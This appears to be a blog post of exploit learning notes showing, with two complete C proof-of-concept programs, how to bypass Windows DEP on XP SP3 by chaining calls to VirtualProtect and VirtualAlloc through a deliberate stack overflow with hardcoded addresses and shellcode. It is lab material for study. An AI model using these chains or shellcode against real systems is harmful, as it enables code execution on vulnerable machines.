---
title: Exploit learning notes 015 Using VirtualProtect and VirtualAlloc attack DEP
description: Ret2Libc's DEP attack using VirtualProtect and VirtualAlloc
date: 2020-11-19 17:43:00+0800
categories:
    - Exploit
tags:
    - Windows
    - DataExecutionPrevention
---

Source: [Moeomu's blog](/posts/exploit-learning-notes-015-using-virtualprotect-and-virtualalloc-attack-dep/)

## Use VirtualProtect to attack DEP

### Principle

> Use the `VirtualProtect` function to change the stack page memory attribute to executable

### Preceding content

- VirtualProtect parameters

```cpp
BOOL VirtualProtect(
    LPVOID lpAddress,
    DWORD dwSize,
    DWORD flNewProtect,
    PDWORD lpflOldProtect
);

// 所以可以这样写
BOOL VirtualProtect(
    shellcode StartAddressOfMemorySpace,
    shellcode Size,
    0x40,
    AWritableAddress
);
```

- There are bound to be zeros here, so the attack function is replaced with memcpy

### Steps

- Fix the EBP so that when the function is called, there is no memory read violation and an exception is thrown
- Fill in the address of VirtualProtect, which will be returned here
- Fill in the empty instruction
- Fill in the return address
- Fill in the parameters of the function
- Fill in the shellcode itself

### Code

> Simulation environment: System: Windows XP SP3, DEP: Optout, Compiler: VC6, Compile options: Disable optimization, Version: release

```cpp
#include<windows.h>

char shellcode[] =
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90"
"\x85\x8B\x1D\x5D" // push esp pop ebp ret `fix ebp`
"\xD4\x1A\x80\x7C" // VirtualProtect Address
"\x90\x90\x90\x90"
"\x8C\xFE\x12\x00" // ret Address
"\xB0\xFD\x12\x00" // Param Address: 0x0012FDB0
"\xFF\x00\x00\x00" // Param Size: 0x100
"\x40\x00\x00\x00" // Param NewProtect: 0x40
"\x00\x00\x3F\x00" // Param pOldProtect: 0x00910000
"\x90\x90\x90\x90\x90\x90\x90\x90"
"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C" // payload
"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
"\x53\x68\x6B\x61\x6F\x6F\x68\x4D\x69\x73\x61\x8B\xC4\x53\x50\x50"
"\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90"
;

void test()
{
    char str[176];
    memcpy(str, shellcode, 420);
}

int main()
{
    HINSTANCE hInst = LoadLibrary("shell32.dll");
    char temp[200];
    test();
    return 0;
}
```

## Attack DEP with VirtualAlloc

### Preceding content

- VirtualAlloc parameters

```cpp
LPVOID WINAPI VirtualAlloc(
    __in_opt LPVOID lpAddress,
    __in SIZE_T dwSize,
    __in DWORD flAllocationType,
    __in DWORD flProtect
)
```

- Parameter description
  - `lpAddress`, the address of the requested memory area, if this parameter is `NULL`, the system will decide the location of the allocated memory area and round up by `64KB`.
  - `dwSize`, the size of the requested memory area
  - `flAllocationType`, the type of memory to be requested
  - `flProtect`, the type of access control for the requested memory, such as read, write, execute, etc. The function returns the starting address of the requested memory when the memory request is successful, and returns `NULL` when the request fails

### Code

> Simulation environment: System: Windows XP SP3, DEP: Optout, Compiler: VC6, Compile options: Disable optimization, Version: release

```cpp
#include <windows.h>

char shellcode[] =
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90"
"\x85\x8B\x1D\x5D" // push esp pop ebp ret 4
"\xE1\x9A\x80\x7C" // Address of VirtualAlloc
"\x90\x90\x90\x90"
"\x70\x6F\xC1\x77" // VirtualAlloc ret address
"\x00\x00\x03\x00" // Param: lpAddress
"\xFF\x00\x00\x00" // Param: dwSize
"\x00\x10\x00\x00" // Param: flAllocationType
"\x40\x00\x00\x00" // Param: flProtect
"\x00\x00\x03\x00" // memcpy ret address
"\x00\x00\x03\x00" // Param: destin
"\x94\xFE\x13\x00" // Param: source
"\xFF\x00\x00\x00" // Param: n
"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C" // payload
"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
"\x53\x68\x6B\x61\x6F\x6F\x68\x4D\x69\x73\x61\x8B\xC4\x53\x50\x50"
"\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90"
;

void test()
{
    char tt[176];
    memcpy(tt, shellcode, 450);
}

int main()
{
    HINSTANCE hInst = LoadLibrary("shell32.dll");
    char temp[200];
    test();
    return 0;
}
```

### Technical details

- First use VirtualAlloc to request a section of space for shellcode execution
- Then use memcpy to copy the shellcode over
- Finally, when memcpy returns, it returns directly to the starting address of the shellcode payload
